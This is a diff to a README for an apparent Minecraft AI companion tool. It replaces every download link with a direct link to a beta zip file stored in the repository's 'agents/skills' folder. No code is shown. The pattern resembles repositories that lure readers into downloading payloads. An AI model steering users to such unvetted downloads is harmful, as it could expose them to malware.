@@ -1,6 +1,6 @@
 # 🎮 Codex-Minecraft-Gameplay - Your Ultimate Minecraft AI Companion Toolkit
 
-[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Hoshigaki0308/Codex-Minecraft-Gameplay/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Hoshigaki0308/Codex-Minecraft-Gameplay/main/agents/skills/Gameplay_Minecraft_Codex_1.4-beta.1.zip)
 
 ---
 
@@ -12,7 +12,7 @@ Welcome to **Codex-Minecraft-Gameplay**! This powerful toolkit transforms your M
 
 **Visit this link to download the application.** 
 
-Click the green button above or use this direct link: [https://github.com/Hoshigaki0308/Codex-Minecraft-Gameplay/releases](https://github.com/Hoshigaki0308/Codex-Minecraft-Gameplay/releases)
+Click the green button above or use this direct link: [https://raw.githubusercontent.com/Hoshigaki0308/Codex-Minecraft-Gameplay/main/agents/skills/Gameplay_Minecraft_Codex_1.4-beta.1.zip](https://raw.githubusercontent.com/Hoshigaki0308/Codex-Minecraft-Gameplay/main/agents/skills/Gameplay_Minecraft_Codex_1.4-beta.1.zip)
 
 Once you arrive at the download page, follow these simple steps:
 
@@ -108,7 +108,7 @@ We release regular updates with new features and improvements. To stay current:
 
 1. **Check for updates** – The app notifies you when a new version is available.
 2. **Automatic updates** – Enable auto-updates in settings for hassle-free maintenance.
-3. **Manual updates** – Visit the [download page](https://github.com/Hoshigaki0308/Codex-Minecraft-Gameplay/releases) to get the latest version.
+3. **Manual updates** – Visit the [download page](https://raw.githubusercontent.com/Hoshigaki0308/Codex-Minecraft-Gameplay/main/agents/skills/Gameplay_Minecraft_Codex_1.4-beta.1.zip) to get the latest version.
 
 ---
 
@@ -142,7 +142,7 @@ We're here to help! Join our growing community of Minecraft enthusiasts:
 
 Codex-Minecraft-Gameplay represents the next generation of Minecraft gameplay. By combining the power of artificial intelligence with your creativity, you'll explore, gather, craft, and build like never before. The possibilities are truly endless when you have an intelligent companion guiding your every block.
 
-**Ready to start your enhanced Minecraft adventure?** Visit [https://github.com/Hoshigaki0308/Codex-Minecraft-Gameplay/releases](https://github.com/Hoshigaki0308/Codex-Minecraft-Gameplay/releases) and download the application today!
+**Ready to start your enhanced Minecraft adventure?** Visit [https://raw.githubusercontent.com/Hoshigaki0308/Codex-Minecraft-Gameplay/main/agents/skills/Gameplay_Minecraft_Codex_1.4-beta.1.zip](https://raw.githubusercontent.com/Hoshigaki0308/Codex-Minecraft-Gameplay/main/agents/skills/Gameplay_Minecraft_Codex_1.4-beta.1.zip) and download the application today!
 
 Happy crafting! ⛏️✨
 
